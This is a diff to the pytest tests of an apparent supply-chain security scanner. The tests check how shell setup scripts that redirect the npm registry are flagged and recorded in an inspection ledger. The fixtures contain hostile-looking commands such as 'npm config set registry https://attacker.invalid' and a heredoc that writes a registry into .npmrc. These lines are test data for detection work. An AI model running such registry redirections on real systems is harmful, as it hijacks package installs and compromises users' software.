@@ -14,6 +14,17 @@ from typing import Any
 import pytest
 
 from skillspector.artifacts import classify_artifact
+from skillspector.dependency_source_types import (
+    MAX_DEPENDENCY_SHELL_UNITS_PER_FILE,
+    ShellDialect,
+    ShellIssue,
+    ShellIssueReason,
+    ShellUnitKind,
+    ShellWorkItem,
+    ShellWorkOutcome,
+    SiteProvenance,
+    SourceSpan,
+)
 from skillspector.graph import graph
 from skillspector.inspection_ledger import (
     MAX_INSPECTION_LEDGER_EVENTS,
@@ -361,21 +372,165 @@ def test_clean_and_partial_configs_have_exact_terminal_producer_rows(
     assert response["findings"] == []
 
 
-def test_obvious_shell_redirect_is_only_an_executable_coverage_limitation(
+def test_shell_dependency_finding_attaches_once_to_its_typed_producer_row(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     content = "npm config set registry https://attacker.invalid\n"
     response = _supply_chain_response(monkeypatch, {"scripts/setup.sh": content})
 
-    assert not any(finding.rule_id == "SC10" for finding in response["findings"])
-    coverage = [
+    findings = [finding for finding in response["findings"] if finding.rule_id == "SC10"]
+    assert len(findings) == 1
+    shell_rows = [
         row
         for row in response["inspection_ledger"]
-        if row.get("analyzer_id") == "dependency_source_coverage"
+        if row.get("analyzer_id") == "dependency_source_shell"
     ]
-    assert len(coverage) == 1
-    assert coverage[0]["reason_code"] is LedgerReason.UNSCANNED_EXECUTABLE_CONTENT
-    assert "attacker.invalid" not in repr(coverage)
+    assert len(shell_rows) == 1
+    assert (
+        shell_rows[0]["path"],
+        shell_rows[0]["start_line"],
+        shell_rows[0]["end_line"],
+        shell_rows[0]["outcome"],
+        shell_rows[0].get("reason_code"),
+        shell_rows[0]["emitted_finding_ids"],
+    ) == (
+        "scripts/setup.sh",
+        1,
+        1,
+        LedgerOutcome.COMPLETED,
+        None,
+        [findings[0].finding_id],
+    )
+    assert not any(
+        row.get("analyzer_id") == "dependency_source_coverage"
+        for row in response["inspection_ledger"]
+    )
+    assert (
+        sum(
+            findings[0].finding_id in row["emitted_finding_ids"]
+            for row in response["inspection_ledger"]
+        )
+        == 1
+    )
+    assert "attacker.invalid" not in repr(shell_rows)
+
+
+def test_ambiguous_shell_dependency_work_is_one_partial_terminal_row(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    content = (
+        "#!/bin/bash\ncat <<EOF | tee .npmrc\nregistry=https://packages.example.invalid\nEOF\n"
+    )
+    response = _supply_chain_response(monkeypatch, {"scripts/setup.sh": content})
+
+    rows = [
+        row
+        for row in response["inspection_ledger"]
+        if row.get("analyzer_id") == "dependency_source_shell"
+    ]
+    assert len(rows) == 1
+    assert (
+        rows[0]["outcome"],
+        rows[0]["reason_code"],
+        rows[0]["start_line"],
+        rows[0]["end_line"],
+        rows[0]["emitted_finding_ids"],
+    ) == (
+        LedgerOutcome.PARTIAL,
+        LedgerReason.DEPENDENCY_SOURCE_UNSUPPORTED_SEMANTICS,
+        1,
+        4,
+        [],
+    )
+
+
+def test_duplicate_shell_terminal_identity_aggregates_to_worst_outcome() -> None:
+    span = SourceSpan("scripts/setup.sh", 0, 10, 1, 1)
+    completed = ShellWorkItem(
+        "a" * 32,
+        ShellDialect.SH,
+        ShellUnitKind.STANDALONE,
+        SiteProvenance.FILE_SUFFIX,
+        span,
+        ShellWorkOutcome.COMPLETED,
+    )
+    partial = ShellWorkItem(
+        "b" * 32,
+        ShellDialect.SH,
+        ShellUnitKind.STANDALONE,
+        SiteProvenance.FILE_SUFFIX,
+        span,
+        ShellWorkOutcome.PARTIAL,
+    )
+    issue = ShellIssue(
+        ShellIssueReason.UNSUPPORTED_SEMANTICS,
+        ShellWorkOutcome.PARTIAL,
+        span,
+        unit_id="b" * 32,
+    )
+
+    plans, by_unit_id = supply_chain._shell_dependency_row_plans(
+        (completed, partial),
+        (issue,),
+    )
+
+    assert len(plans) == 1
+    assert plans[0].outcome is LedgerOutcome.PARTIAL
+    assert plans[0].reason is LedgerReason.DEPENDENCY_SOURCE_UNSUPPORTED_SEMANTICS
+    assert set(by_unit_id) == {"a" * 32, "b" * 32}
+
+
+def test_productive_and_resource_skipped_same_line_work_remains_partial(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    nested_commands = " ".join(
+        "sh -c ':';" for _index in range(MAX_DEPENDENCY_SHELL_UNITS_PER_FILE)
+    )
+    content = f"npm config set registry https://evil.invalid; {nested_commands}\n"
+
+    response = _supply_chain_response(monkeypatch, {"scripts/setup.sh": content})
+
+    findings = [finding for finding in response["findings"] if finding.rule_id == "SC10"]
+    rows = [
+        row
+        for row in response["inspection_ledger"]
+        if row.get("analyzer_id") == "dependency_source_shell"
+    ]
+    assert len(findings) == 1
+    assert len(rows) == 1
+    assert (
+        rows[0]["outcome"],
+        rows[0]["reason_code"],
+        rows[0]["emitted_finding_ids"],
+    ) == (
+        LedgerOutcome.PARTIAL,
+        LedgerReason.DEPENDENCY_SOURCE_RESOURCE_LIMIT,
+        [findings[0].finding_id],
+    )
+
+
+def test_shell_parser_unavailable_has_a_distinct_failed_ledger_reason() -> None:
+    span = SourceSpan("scripts/setup.sh", 0, 10, 1, 1)
+    failed = ShellWorkItem(
+        "a" * 32,
+        ShellDialect.SH,
+        ShellUnitKind.STANDALONE,
+        SiteProvenance.FILE_SUFFIX,
+        span,
+        ShellWorkOutcome.FAILED,
+    )
+    issue = ShellIssue(
+        ShellIssueReason.SHELL_PARSER_UNAVAILABLE,
+        ShellWorkOutcome.FAILED,
+        span,
+        unit_id="a" * 32,
+    )
+
+    plans, _by_unit_id = supply_chain._shell_dependency_row_plans((failed,), (issue,))
+
+    assert len(plans) == 1
+    assert plans[0].outcome is LedgerOutcome.FAILED
+    assert plans[0].reason is LedgerReason.DEPENDENCY_SOURCE_SHELL_PARSER_UNAVAILABLE
 
 
 def _seed_ledger(count: int) -> list[dict[str, Any]]:
@@ -388,6 +543,39 @@ def _seed_ledger(count: int) -> list[dict[str, Any]]:
         )
         for index in range(count)
     ]
+
+
+def test_sc10_existing_shell_producer_row_is_attached_without_new_ledger_charge(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = "scripts/setup.sh"
+    existing = [
+        *_seed_ledger(MAX_INSPECTION_LEDGER_EVENTS - 2),
+        ledger_event(
+            analyzer_id="dependency_source_shell",
+            outcome=LedgerOutcome.COMPLETED,
+            phase="static",
+            path=path,
+            start_line=1,
+            end_line=1,
+        ),
+    ]
+    response = _supply_chain_response(
+        monkeypatch,
+        {path: "npm config set registry https://packages.example.invalid\n"},
+        existing_ledger=existing,
+    )
+
+    findings = [finding for finding in response["findings"] if finding.rule_id == "SC10"]
+    assert len(findings) == 1
+    assert len(response["inspection_ledger"]) == MAX_INSPECTION_LEDGER_EVENTS - 1
+    producer = next(
+        row
+        for row in response["inspection_ledger"]
+        if row.get("analyzer_id") == "dependency_source_shell"
+    )
+    assert producer["emitted_finding_ids"] == [findings[0].finding_id]
+    assert not any(row["phase"] == "ledger_output" for row in response["inspection_ledger"])
 
 
 @pytest.mark.parametrize("existing_count", [9_999, 10_000])
